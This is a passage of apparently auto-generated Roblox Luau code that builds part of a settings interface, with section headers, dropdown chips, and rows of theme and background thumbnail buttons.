-- UIStroke_45 (UIStroke)
G.UIStroke_45 = Instance.new("UIStroke")
G.UIStroke_45.Color = Color3.fromRGB(55, 60, 72)
G.UIStroke_45.Transparency = 0.40000000596046448
G.UIStroke_45.Parent = G.DropChip_4

-- TextLabel_51 (TextLabel)
G.TextLabel_51 = Instance.new("TextLabel")
G.TextLabel_51.BackgroundTransparency = 1
G.TextLabel_51.Position = UDim2.new(0, 8, 0, 0)
G.TextLabel_51.Size = UDim2.new(1, -22, 1, 0)
G.TextLabel_51.ZIndex = 13
G.TextLabel_51.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_51.Text = "Blue"
G.TextLabel_51.TextColor3 = Color3.fromRGB(200, 204, 216)
G.TextLabel_51.TextSize = 12
G.TextLabel_51.TextTruncate = Enum.TextTruncate.AtEnd
G.TextLabel_51.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_51.Parent = G.DropChip_4

-- TextLabel_52 (TextLabel)
G.TextLabel_52 = Instance.new("TextLabel")
G.TextLabel_52.BackgroundTransparency = 1
G.TextLabel_52.Position = UDim2.new(1, -18, 0, 0)
G.TextLabel_52.Size = UDim2.new(0, 18, 1, 0)
G.TextLabel_52.ZIndex = 13
G.TextLabel_52.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_52.Text = "v"
G.TextLabel_52.TextColor3 = Color3.fromRGB(150, 155, 168)
G.TextLabel_52.TextSize = 11
G.TextLabel_52.Parent = G.DropChip_4

-- Frame_91 (Frame)
G.Frame_91 = Instance.new("Frame")
G.Frame_91.BackgroundTransparency = 1
G.Frame_91.BorderSizePixel = 0
G.Frame_91.LayoutOrder = 55
G.Frame_91.Size = UDim2.new(1, 0, 0, 38)
G.Frame_91.Parent = G.Page3

-- TextLabel_53 (TextLabel)
G.TextLabel_53 = Instance.new("TextLabel")
G.TextLabel_53.BackgroundTransparency = 1
G.TextLabel_53.Position = UDim2.new(0, 8, 0, 6)
G.TextLabel_53.Size = UDim2.new(1, -12, 0, 24)
G.TextLabel_53.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_53.Text = "BUTTON MODE"
G.TextLabel_53.TextColor3 = Color3.fromRGB(245, 245, 250)
G.TextLabel_53.TextSize = 15
G.TextLabel_53.TextStrokeTransparency = 0.85000002384185791
G.TextLabel_53.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_53.Parent = G.Frame_91

-- Frame_92 (Frame)
G.Frame_92 = Instance.new("Frame")
G.Frame_92.BackgroundColor3 = Color3.fromRGB(70, 120, 220)
G.Frame_92.BackgroundTransparency = 0.34999999403953552
G.Frame_92.BorderSizePixel = 0
G.Frame_92.Position = UDim2.new(0, 8, 1, -4)
G.Frame_92.Size = UDim2.new(1, -16, 0, 2)
G.Frame_92.Parent = G.Frame_91

-- Frame_93 (Frame)
G.Frame_93 = Instance.new("Frame")
G.Frame_93.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_93.BorderSizePixel = 0
G.Frame_93.ClipsDescendants = true
G.Frame_93.LayoutOrder = 56
G.Frame_93.Size = UDim2.new(1, 0, 0, 40)
G.Frame_93.Parent = G.Page3

-- UICorner_94 (UICorner)
G.UICorner_94 = Instance.new("UICorner")
G.UICorner_94.CornerRadius = UDim.new(0, 14)
G.UICorner_94.Parent = G.Frame_93

-- UIStroke_46 (UIStroke)
G.UIStroke_46 = Instance.new("UIStroke")
G.UIStroke_46.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_46.Parent = G.Frame_93

-- TextLabel_54 (TextLabel)
G.TextLabel_54 = Instance.new("TextLabel")
G.TextLabel_54.BackgroundTransparency = 1
G.TextLabel_54.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_54.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_54.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_54.Text = "Button Mode"
G.TextLabel_54.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_54.TextSize = 14
G.TextLabel_54.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_54.Parent = G.Frame_93

-- DropChip_5 (TextButton)
G.DropChip_5 = Instance.new("TextButton")
G.DropChip_5.Name = "DropChip"
G.DropChip_5.BackgroundColor3 = Color3.fromRGB(16, 16, 22)
G.DropChip_5.BorderSizePixel = 0
G.DropChip_5.Position = UDim2.new(1, -120, 0, 7)
G.DropChip_5.Size = UDim2.new(0, 110, 0, 26)
G.DropChip_5.ZIndex = 12
G.DropChip_5.AutoButtonColor = false
G.DropChip_5.Text = ""
G.DropChip_5:SetAttribute("PrintedSoundWired", true)
G.DropChip_5.Parent = G.Frame_93

-- UICorner_95 (UICorner)
G.UICorner_95 = Instance.new("UICorner")
G.UICorner_95.Parent = G.DropChip_5

-- UIStroke_47 (UIStroke)
G.UIStroke_47 = Instance.new("UIStroke")
G.UIStroke_47.Color = Color3.fromRGB(55, 60, 72)
G.UIStroke_47.Transparency = 0.40000000596046448
G.UIStroke_47.Parent = G.DropChip_5

-- TextLabel_55 (TextLabel)
G.TextLabel_55 = Instance.new("TextLabel")
G.TextLabel_55.BackgroundTransparency = 1
G.TextLabel_55.Position = UDim2.new(0, 8, 0, 0)
G.TextLabel_55.Size = UDim2.new(1, -22, 1, 0)
G.TextLabel_55.ZIndex = 13
G.TextLabel_55.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_55.Text = "Background"
G.TextLabel_55.TextColor3 = Color3.fromRGB(200, 204, 216)
G.TextLabel_55.TextSize = 12
G.TextLabel_55.TextTruncate = Enum.TextTruncate.AtEnd
G.TextLabel_55.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_55.Parent = G.DropChip_5

-- TextLabel_56 (TextLabel)
G.TextLabel_56 = Instance.new("TextLabel")
G.TextLabel_56.BackgroundTransparency = 1
G.TextLabel_56.Position = UDim2.new(1, -18, 0, 0)
G.TextLabel_56.Size = UDim2.new(0, 18, 1, 0)
G.TextLabel_56.ZIndex = 13
G.TextLabel_56.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_56.Text = "v"
G.TextLabel_56.TextColor3 = Color3.fromRGB(150, 155, 168)
G.TextLabel_56.TextSize = 11
G.TextLabel_56.Parent = G.DropChip_5

-- Frame_94 (Frame)
G.Frame_94 = Instance.new("Frame")
G.Frame_94.BackgroundTransparency = 1
G.Frame_94.BorderSizePixel = 0
G.Frame_94.LayoutOrder = 57
G.Frame_94.Size = UDim2.new(1, 0, 0, 38)
G.Frame_94.Parent = G.Page3

-- TextLabel_57 (TextLabel)
G.TextLabel_57 = Instance.new("TextLabel")
G.TextLabel_57.BackgroundTransparency = 1
G.TextLabel_57.Position = UDim2.new(0, 8, 0, 6)
G.TextLabel_57.Size = UDim2.new(1, -12, 0, 24)
G.TextLabel_57.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_57.Text = "BUTTON THEMES"
G.TextLabel_57.TextColor3 = Color3.fromRGB(245, 245, 250)
G.TextLabel_57.TextSize = 15
G.TextLabel_57.TextStrokeTransparency = 0.85000002384185791
G.TextLabel_57.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_57.Parent = G.Frame_94

-- Frame_95 (Frame)
G.Frame_95 = Instance.new("Frame")
G.Frame_95.BackgroundColor3 = Color3.fromRGB(70, 120, 220)
G.Frame_95.BackgroundTransparency = 0.34999999403953552
G.Frame_95.BorderSizePixel = 0
G.Frame_95.Position = UDim2.new(0, 8, 1, -4)
G.Frame_95.Size = UDim2.new(1, -16, 0, 2)
G.Frame_95.Parent = G.Frame_94

-- Frame_96 (Frame)
G.Frame_96 = Instance.new("Frame")
G.Frame_96.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_96.BorderSizePixel = 0
G.Frame_96.ClipsDescendants = true
G.Frame_96.LayoutOrder = 58
G.Frame_96.Size = UDim2.new(1, 0, 0, 64)
G.Frame_96.Parent = G.Page3

-- UICorner_96 (UICorner)
G.UICorner_96 = Instance.new("UICorner")
G.UICorner_96.CornerRadius = UDim.new(0, 14)
G.UICorner_96.Parent = G.Frame_96

-- UIStroke_48 (UIStroke)
G.UIStroke_48 = Instance.new("UIStroke")
G.UIStroke_48.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_48.Parent = G.Frame_96

-- ScrollingFrame (ScrollingFrame)
G.ScrollingFrame = Instance.new("ScrollingFrame")
G.ScrollingFrame.BackgroundTransparency = 1
G.ScrollingFrame.BorderSizePixel = 0
G.ScrollingFrame.Position = UDim2.new(0, 6, 0, 5)
G.ScrollingFrame.Size = UDim2.new(1, -12, 1, -10)
G.ScrollingFrame.ZIndex = 5
G.ScrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.X
G.ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
G.ScrollingFrame.ScrollBarThickness = 0
G.ScrollingFrame.ScrollingDirection = Enum.ScrollingDirection.X
G.ScrollingFrame.Parent = G.Frame_96

-- UIListLayout_4 (UIListLayout)
G.UIListLayout_4 = Instance.new("UIListLayout")
G.UIListLayout_4.FillDirection = Enum.FillDirection.Horizontal
G.UIListLayout_4.Padding = UDim.new(0, 8)
G.UIListLayout_4.SortOrder = Enum.SortOrder.LayoutOrder
G.UIListLayout_4.VerticalAlignment = Enum.VerticalAlignment.Center
G.UIListLayout_4.Parent = G.ScrollingFrame

-- ThemeNone (TextButton)
G.ThemeNone = Instance.new("TextButton")
G.ThemeNone.Name = "ThemeNone"
G.ThemeNone.BackgroundColor3 = Color3.fromRGB(28, 28, 36)
G.ThemeNone.BorderSizePixel = 0
G.ThemeNone.LayoutOrder = 1
G.ThemeNone.Size = UDim2.new(0, 52, 0, 44)
G.ThemeNone.ZIndex = 6
G.ThemeNone.AutoButtonColor = false
G.ThemeNone.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.ThemeNone.Text = "None"
G.ThemeNone.TextColor3 = Color3.fromRGB(220, 220, 230)
G.ThemeNone.TextSize = 11
G.ThemeNone:SetAttribute("PrintedSoundWired", true)
G.ThemeNone.Parent = G.ScrollingFrame

-- UICorner_97 (UICorner)
G.UICorner_97 = Instance.new("UICorner")
G.UICorner_97.Parent = G.ThemeNone

-- UIStroke_49 (UIStroke)
G.UIStroke_49 = Instance.new("UIStroke")
G.UIStroke_49.Color = Color3.fromRGB(70, 70, 80)
G.UIStroke_49.Transparency = 0.44999998807907104
G.UIStroke_49.Parent = G.ThemeNone

-- Theme1 (ImageButton)
G.Theme1 = Instance.new("ImageButton")
G.Theme1.Name = "Theme1"
G.Theme1.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
G.Theme1.BorderSizePixel = 0
G.Theme1.LayoutOrder = 2
G.Theme1.Size = UDim2.new(0, 52, 0, 44)
G.Theme1.ZIndex = 6
G.Theme1.AutoButtonColor = false
G.Theme1.Image = "rbxassetid://135988097101926"
G.Theme1.ImageTransparency = 0.2800000011920929
G.Theme1.ScaleType = Enum.ScaleType.Crop
G.Theme1.Parent = G.ScrollingFrame

-- UICorner_98 (UICorner)
G.UICorner_98 = Instance.new("UICorner")
G.UICorner_98.Parent = G.Theme1

-- UIStroke_50 (UIStroke)
G.UIStroke_50 = Instance.new("UIStroke")
G.UIStroke_50.Color = Color3.fromRGB(70, 70, 80)
G.UIStroke_50.Transparency = 0.44999998807907104
G.UIStroke_50.Parent = G.Theme1

-- Theme2 (ImageButton)
G.Theme2 = Instance.new("ImageButton")
G.Theme2.Name = "Theme2"
G.Theme2.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
G.Theme2.BorderSizePixel = 0
G.Theme2.LayoutOrder = 3
G.Theme2.Size = UDim2.new(0, 52, 0, 44)
G.Theme2.ZIndex = 6
G.Theme2.AutoButtonColor = false
G.Theme2.Image = "rbxassetid://122809280617698"
G.Theme2.ScaleType = Enum.ScaleType.Crop
G.Theme2.Parent = G.ScrollingFrame

-- UICorner_99 (UICorner)
G.UICorner_99 = Instance.new("UICorner")
G.UICorner_99.Parent = G.Theme2

-- UIStroke_51 (UIStroke)
G.UIStroke_51 = Instance.new("UIStroke")
G.UIStroke_51.Color = Color3.fromRGB(255, 255, 255)
G.UIStroke_51.Thickness = 2
G.UIStroke_51.Parent = G.Theme2

-- Theme3 (ImageButton)
G.Theme3 = Instance.new("ImageButton")
G.Theme3.Name = "Theme3"
G.Theme3.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
G.Theme3.BorderSizePixel = 0
G.Theme3.LayoutOrder = 4
G.Theme3.Size = UDim2.new(0, 52, 0, 44)
G.Theme3.ZIndex = 6
G.Theme3.AutoButtonColor = false
G.Theme3.Image = "rbxassetid://90207534864065"
G.Theme3.ImageTransparency = 0.2800000011920929
G.Theme3.ScaleType = Enum.ScaleType.Crop
G.Theme3.Parent = G.ScrollingFrame

-- UICorner_100 (UICorner)
G.UICorner_100 = Instance.new("UICorner")
G.UICorner_100.Parent = G.Theme3

-- UIStroke_52 (UIStroke)
G.UIStroke_52 = Instance.new("UIStroke")
G.UIStroke_52.Color = Color3.fromRGB(70, 70, 80)
G.UIStroke_52.Transparency = 0.44999998807907104
G.UIStroke_52.Parent = G.Theme3

-- Theme4 (ImageButton)
G.Theme4 = Instance.new("ImageButton")
G.Theme4.Name = "Theme4"
G.Theme4.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
G.Theme4.BorderSizePixel = 0
G.Theme4.LayoutOrder = 5
G.Theme4.Size = UDim2.new(0, 52, 0, 44)
G.Theme4.ZIndex = 6
G.Theme4.AutoButtonColor = false
G.Theme4.Image = "rbxassetid://75753198764412"
G.Theme4.ImageTransparency = 0.2800000011920929
G.Theme4.ScaleType = Enum.ScaleType.Crop
G.Theme4.Parent = G.ScrollingFrame

-- UICorner_101 (UICorner)
G.UICorner_101 = Instance.new("UICorner")
G.UICorner_101.Parent = G.Theme4

-- UIStroke_53 (UIStroke)
G.UIStroke_53 = Instance.new("UIStroke")
G.UIStroke_53.Color = Color3.fromRGB(70, 70, 80)
G.UIStroke_53.Transparency = 0.44999998807907104
G.UIStroke_53.Parent = G.Theme4

-- Frame_97 (Frame)
G.Frame_97 = Instance.new("Frame")
G.Frame_97.BackgroundTransparency = 1
G.Frame_97.BorderSizePixel = 0
G.Frame_97.LayoutOrder = 59
G.Frame_97.Size = UDim2.new(1, 0, 0, 38)
G.Frame_97.Parent = G.Page3

-- TextLabel_58 (TextLabel)
G.TextLabel_58 = Instance.new("TextLabel")
G.TextLabel_58.BackgroundTransparency = 1
G.TextLabel_58.Position = UDim2.new(0, 8, 0, 6)
G.TextLabel_58.Size = UDim2.new(1, -12, 0, 24)
G.TextLabel_58.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_58.Text = "BACKGROUND"
G.TextLabel_58.TextColor3 = Color3.fromRGB(245, 245, 250)
G.TextLabel_58.TextSize = 15
G.TextLabel_58.TextStrokeTransparency = 0.85000002384185791
G.TextLabel_58.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_58.Parent = G.Frame_97

-- Frame_98 (Frame)
G.Frame_98 = Instance.new("Frame")
G.Frame_98.BackgroundColor3 = Color3.fromRGB(70, 120, 220)
G.Frame_98.BackgroundTransparency = 0.34999999403953552
G.Frame_98.BorderSizePixel = 0
G.Frame_98.Position = UDim2.new(0, 8, 1, -4)
G.Frame_98.Size = UDim2.new(1, -16, 0, 2)
G.Frame_98.Parent = G.Frame_97

-- Frame_99 (Frame)
G.Frame_99 = Instance.new("Frame")
G.Frame_99.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_99.BorderSizePixel = 0
G.Frame_99.ClipsDescendants = true
G.Frame_99.LayoutOrder = 60
G.Frame_99.Size = UDim2.new(1, 0, 0, 56)
G.Frame_99.Parent = G.Page3

-- UICorner_102 (UICorner)
G.UICorner_102 = Instance.new("UICorner")
G.UICorner_102.CornerRadius = UDim.new(0, 14)
G.UICorner_102.Parent = G.Frame_99

-- UIStroke_54 (UIStroke)
G.UIStroke_54 = Instance.new("UIStroke")
G.UIStroke_54.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_54.Parent = G.Frame_99

-- ScrollingFrame_2 (ScrollingFrame)
G.ScrollingFrame_2 = Instance.new("ScrollingFrame")
G.ScrollingFrame_2.BackgroundTransparency = 1
G.ScrollingFrame_2.BorderSizePixel = 0
G.ScrollingFrame_2.Position = UDim2.new(0, 6, 0, 5)
G.ScrollingFrame_2.Size = UDim2.new(1, -12, 1, -10)
G.ScrollingFrame_2.ZIndex = 5
G.ScrollingFrame_2.AutomaticCanvasSize = Enum.AutomaticSize.X
G.ScrollingFrame_2.CanvasSize = UDim2.new(0, 0, 0, 0)
G.ScrollingFrame_2.ScrollBarThickness = 0
G.ScrollingFrame_2.ScrollingDirection = Enum.ScrollingDirection.X
G.ScrollingFrame_2.Parent = G.Frame_99

-- UIListLayout_5 (UIListLayout)
G.UIListLayout_5 = Instance.new("UIListLayout")
G.UIListLayout_5.FillDirection = Enum.FillDirection.Horizontal
G.UIListLayout_5.Padding = UDim.new(0, 6)
G.UIListLayout_5.SortOrder = Enum.SortOrder.LayoutOrder
G.UIListLayout_5.VerticalAlignment = Enum.VerticalAlignment.Center
G.UIListLayout_5.Parent = G.ScrollingFrame_2

-- BgThumb1 (ImageButton)
G.BgThumb1 = Instance.new("ImageButton")
G.BgThumb1.Name = "BgThumb1"
G.BgThumb1.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
G.BgThumb1.BorderSizePixel = 0
G.BgThumb1.LayoutOrder = 1
G.BgThumb1.Size = UDim2.new(0, 52, 0, 40)
G.BgThumb1.ZIndex = 6
G.BgThumb1.AutoButtonColor = false
G.BgThumb1.Image = "rbxassetid://90631990302263"
G.BgThumb1.ImageTransparency = 0.2800000011920929
G.BgThumb1.ScaleType = Enum.ScaleType.Crop
G.BgThumb1.Parent = G.ScrollingFrame_2

-- UICorner_103 (UICorner)
G.UICorner_103 = Instance.new("UICorner")
G.UICorner_103.Parent = G.BgThumb1

-- UIStroke_55 (UIStroke)
G.UIStroke_55 = Instance.new("UIStroke")
G.UIStroke_55.Color = Color3.fromRGB(70, 70, 80)
G.UIStroke_55.Transparency = 0.5
G.UIStroke_55.Parent = G.BgThumb1

-- BgThumb2 (ImageButton)
G.BgThumb2 = Instance.new("ImageButton")
G.BgThumb2.Name = "BgThumb2"
G.BgThumb2.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
G.BgThumb2.BorderSizePixel = 0
G.BgThumb2.LayoutOrder = 2
G.BgThumb2.Size = UDim2.new(0, 52, 0, 40)
G.BgThumb2.ZIndex = 6
G.BgThumb2.AutoButtonColor = false
G.BgThumb2.Image = "rbxassetid://109619268613730"
G.BgThumb2.ImageTransparency = 0.2800000011920929
G.BgThumb2.ScaleType = Enum.ScaleType.Crop
G.BgThumb2.Parent = G.ScrollingFrame_2

-- UICorner_104 (UICorner)
G.UICorner_104 = Instance.new("UICorner")
G.UICorner_104.Parent = G.BgThumb2

-- UIStroke_56 (UIStroke)
G.UIStroke_56 = Instance.new("UIStroke")
G.UIStroke_56.Color = Color3.fromRGB(70, 70, 80)
G.UIStroke_56.Transparency = 0.5
G.UIStroke_56.Parent = G.BgThumb2

-- BgThumb3 (ImageButton)
G.BgThumb3 = Instance.new("ImageButton")
G.BgThumb3.Name = "BgThumb3"
G.BgThumb3.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
G.BgThumb3.BorderSizePixel = 0
G.BgThumb3.LayoutOrder = 3
G.BgThumb3.Size = UDim2.new(0, 52, 0, 40)
G.BgThumb3.ZIndex = 6
G.BgThumb3.AutoButtonColor = false
G.BgThumb3.Image = "rbxassetid://88369503310562"
G.BgThumb3.ScaleType = Enum.ScaleType.Crop
G.BgThumb3.Parent = G.ScrollingFrame_2

-- UICorner_105 (UICorner)
G.UICorner_105 = Instance.new("UICorner")
G.UICorner_105.Parent = G.BgThumb3

-- UIStroke_57 (UIStroke)
G.UIStroke_57 = Instance.new("UIStroke")
G.UIStroke_57.Color = Color3.fromRGB(255, 255, 255)
G.UIStroke_57.Thickness = 1.7999999523162842
G.UIStroke_57.Parent = G.BgThumb3

-- BgThumb4 (ImageButton)
G.BgThumb4 = Instance.new("ImageButton")
G.BgThumb4.Name = "BgThumb4"
G.BgThumb4.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
G.BgThumb4.BorderSizePixel = 0
G.BgThumb4.LayoutOrder = 4
G.BgThumb4.Size = UDim2.new(0, 52, 0, 40)
G.BgThumb4.ZIndex = 6
G.BgThumb4.AutoButtonColor = false
G.BgThumb4.Image = "rbxassetid://80708025126373"
G.BgThumb4.ImageTransparency = 0.2800000011920929
G.BgThumb4.ScaleType = Enum.ScaleType.Crop
G.BgThumb4.Parent = G.ScrollingFrame_2

-- UICorner_106 (UICorner)
G.UICorner_106 = Instance.new("UICorner")
G.UICorner_106.Parent = G.BgThumb4

-- UIStroke_58 (UIStroke)
G.UIStroke_58 = Instance.new("UIStroke")
G.UIStroke_58.Color = Color3.fromRGB(70, 70, 80)
G.UIStroke_58.Transparency = 0.5
G.UIStroke_58.Parent = G.BgThumb4

-- BgThumb5 (ImageButton)
G.BgThumb5 = Instance.new("ImageButton")
G.BgThumb5.Name = "BgThumb5"
G.BgThumb5.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
G.BgThumb5.BorderSizePixel = 0
G.BgThumb5.LayoutOrder = 5
G.BgThumb5.Size = UDim2.new(0, 52, 0, 40)
G.BgThumb5.ZIndex = 6
G.BgThumb5.AutoButtonColor = false
G.BgThumb5.Image = "rbxassetid://102253425322931"
G.BgThumb5.ImageTransparency = 0.2800000011920929
G.BgThumb5.ScaleType = Enum.ScaleType.Crop
G.BgThumb5.Parent = G.ScrollingFrame_2

-- UICorner_107 (UICorner)
G.UICorner_107 = Instance.new("UICorner")
G.UICorner_107.Parent = G.BgThumb5

-- UIStroke_59 (UIStroke)
G.UIStroke_59 = Instance.new("UIStroke")
G.UIStroke_59.Color = Color3.fromRGB(70, 70, 80)
G.UIStroke_59.Transparency = 0.5
G.UIStroke_59.Parent = G.BgThumb5

-- BgThumb6 (ImageButton)
G.BgThumb6 = Instance.new("ImageButton")
G.BgThumb6.Name = "BgThumb6"
G.BgThumb6.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
G.BgThumb6.BorderSizePixel = 0
G.BgThumb6.LayoutOrder = 6
G.BgThumb6.Size = UDim2.new(0, 52, 0, 40)
G.BgThumb6.ZIndex = 6
G.BgThumb6.AutoButtonColor = false
G.BgThumb6.Image = "rbxassetid://90453834580322"
G.BgThumb6.ImageTransparency = 0.2800000011920929
G.BgThumb6.ScaleType = Enum.ScaleType.Crop
G.BgThumb6.Parent = G.ScrollingFrame_2

-- UICorner_108 (UICorner)
G.UICorner_108 = Instance.new("UICorner")
G.UICorner_108.Parent = G.BgThumb6

-- UIStroke_60 (UIStroke)
G.UIStroke_60 = Instance.new("UIStroke")
G.UIStroke_60.Color = Color3.fromRGB(70, 70, 80)
G.UIStroke_60.Transparency = 0.5
G.UIStroke_60.Parent = G.BgThumb6

-- BgThumb7 (ImageButton)
G.BgThumb7 = Instance.new("ImageButton")
G.BgThumb7.Name = "BgThumb7"
G.BgThumb7.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
G.BgThumb7.BorderSizePixel = 0
G.BgThumb7.LayoutOrder = 7
G.BgThumb7.Size = UDim2.new(0, 52, 0, 40)
G.BgThumb7.ZIndex = 6
G.BgThumb7.AutoButtonColor = false
G.BgThumb7.Image = "rbxassetid://135181794444219"
G.BgThumb7.ImageTransparency = 0.2800000011920929
G.BgThumb7.ScaleType = Enum.ScaleType.Crop
G.BgThumb7.Parent = G.ScrollingFrame_2

-- UICorner_109 (UICorner)
G.UICorner_109 = Instance.new("UICorner")
G.UICorner_109.Parent = G.BgThumb7

-- UIStroke_61 (UIStroke)
G.UIStroke_61 = Instance.new("UIStroke")
G.UIStroke_61.Color = Color3.fromRGB(70, 70, 80)
G.UIStroke_61.Transparency = 0.5
G.UIStroke_61.Parent = G.BgThumb7

-- BgThumb8 (ImageButton)
G.BgThumb8 = Instance.new("ImageButton")
G.BgThumb8.Name = "BgThumb8"
G.BgThumb8.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
G.BgThumb8.BorderSizePixel = 0
G.BgThumb8.LayoutOrder = 8
G.BgThumb8.Size = UDim2.new(0, 52, 0, 40)
G.BgThumb8.ZIndex = 6
G.BgThumb8.AutoButtonColor = false
G.BgThumb8.Image = "rbxassetid://137260740069569"
G.BgThumb8.ImageTransparency = 0.2800000011920929
G.BgThumb8.ScaleType = Enum.ScaleType.Crop
G.BgThumb8.Parent = G.ScrollingFrame_2

-- UICorner_110 (UICorner)
G.UICorner_110 = Instance.new("UICorner")
G.UICorner_110.Parent = G.BgThumb8

-- UIStroke_62 (UIStroke)
G.UIStroke_62 = Instance.new("UIStroke")
G.UIStroke_62.Color = Color3.fromRGB(70, 70, 80)
G.UIStroke_62.Transparency = 0.5
G.UIStroke_62.Parent = G.BgThumb8

-- BgThumb9 (ImageButton)
G.BgThumb9 = Instance.new("ImageButton")
G.BgThumb9.Name = "BgThumb9"
G.BgThumb9.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
G.BgThumb9.BorderSizePixel = 0
G.BgThumb9.LayoutOrder = 9
G.BgThumb9.Size = UDim2.new(0, 52, 0, 40)
G.BgThumb9.ZIndex = 6
G.BgThumb9.AutoButtonColor = false
G.BgThumb9.Image = "rbxassetid://102579945729223"
G.BgThumb9.ImageTransparency = 0.2800000011920929
G.BgThumb9.ScaleType = Enum.ScaleType.Crop
G.BgThumb9.Parent = G.ScrollingFrame_2

-- UICorner_111 (UICorner)
G.UICorner_111 = Instance.new("UICorner")
G.UICorner_111.Parent = G.BgThumb9

-- UIStroke_63 (UIStroke)
G.UIStroke_63 = Instance.new("UIStroke")
G.UIStroke_63.Color = Color3.fromRGB(70, 70, 80)
G.UIStroke_63.Transparency = 0.5
G.UIStroke_63.Parent = G.BgThumb9

-- Page4 (ScrollingFrame)
G.Page4 = Instance.new("ScrollingFrame")
G.Page4.Name = "Page4"
G.Page4.BackgroundTransparency = 1
G.Page4.BorderSizePixel = 0
G.Page4.Size = UDim2.new(1, 0, 1, 0)
G.Page4.Visible = false
G.Page4.AutomaticCanvasSize = Enum.AutomaticSize.Y
G.Page4.CanvasSize = UDim2.new(0, 0, 0, 0)
G.Page4.ScrollBarImageTransparency = 1
G.Page4.ScrollBarThickness = 0
G.Page4.Parent = G.Pages

-- UIListLayout_6 (UIListLayout)
G.UIListLayout_6 = Instance.new("UIListLayout")
G.UIListLayout_6.Padding = UDim.new(0, 3)
G.UIListLayout_6.SortOrder = Enum.SortOrder.LayoutOrder
G.UIListLayout_6.Parent = G.Page4

-- UIPadding_4 (UIPadding)
G.UIPadding_4 = Instance.new("UIPadding")
G.UIPadding_4.PaddingBottom = UDim.new(0, 10)
G.UIPadding_4.PaddingLeft = UDim.new(0, 7)
G.UIPadding_4.PaddingRight = UDim.new(0, 7)
G.UIPadding_4.PaddingTop = UDim.new(0, 7)
G.UIPadding_4.Parent = G.Page4

-- Frame_100 (Frame)
G.Frame_100 = Instance.new("Frame")
G.Frame_100.BackgroundTransparency = 1
G.Frame_100.BorderSizePixel = 0
G.Frame_100.LayoutOrder = 39
G.Frame_100.Size = UDim2.new(1, 0, 0, 38)
G.Frame_100.Parent = G.Page4

-- TextLabel_59 (TextLabel)
G.TextLabel_59 = Instance.new("TextLabel")
G.TextLabel_59.BackgroundTransparency = 1
G.TextLabel_59.Position = UDim2.new(0, 8, 0, 6)
G.TextLabel_59.Size = UDim2.new(1, -12, 0, 24)
G.TextLabel_59.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_59.Text = "MISC"
G.TextLabel_59.TextColor3 = Color3.fromRGB(245, 245, 250)
G.TextLabel_59.TextSize = 15
G.TextLabel_59.TextStrokeTransparency = 0.85000002384185791
G.TextLabel_59.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_59.Parent = G.Frame_100

-- Frame_101 (Frame)
G.Frame_101 = Instance.new("Frame")
G.Frame_101.BackgroundColor3 = Color3.fromRGB(70, 120, 220)
G.Frame_101.BackgroundTransparency = 0.34999999403953552
G.Frame_101.BorderSizePixel = 0
G.Frame_101.Position = UDim2.new(0, 8, 1, -4)
G.Frame_101.Size = UDim2.new(1, -16, 0, 2)
G.Frame_101.Parent = G.Frame_100

-- Frame_102 (Frame)
G.Frame_102 = Instance.new("Frame")
G.Frame_102.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_102.BorderSizePixel = 0
G.Frame_102.ClipsDescendants = true
G.Frame_102.LayoutOrder = 40
G.Frame_102.Size = UDim2.new(1, 0, 0, 40)
G.Frame_102.Parent = G.Page4

-- UICorner_112 (UICorner)
G.UICorner_112 = Instance.new("UICorner")
G.UICorner_112.CornerRadius = UDim.new(0, 14)
G.UICorner_112.Parent = G.Frame_102

-- UIStroke_64 (UIStroke)
